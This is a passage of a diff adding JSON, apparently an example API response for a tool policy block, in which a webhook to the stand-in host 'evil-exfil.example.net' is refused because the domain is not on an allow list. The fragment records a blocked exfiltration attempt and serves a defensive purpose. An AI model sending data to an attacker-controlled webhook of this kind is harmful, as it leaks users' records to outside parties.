+                    "operation_id": "c4e8f0a2-6d1b-4f37-b95a-1d3e7c9a5f62",
+                    "explanation": "Webhook destination host evil-exfil.example.net is not in allowed_webhook_domains.",
+                    "affected_record_count": null,
+                    "timestamp": "2026-11-24T12:01:40Z"
+                  }
+                ]
+              },
+              "request_id": "0e6b2d8a-4c1f-4a93-b7d5-3f9a1c5e7b24",
+              "timestamp": "2026-11-24T12:01:40Z"
+            }
+          },
+          "details_schema": "api.schema.json#/$defs/ToolPolicyBlockDetails"
+        }
+      ]
+    }
+  ]
+}
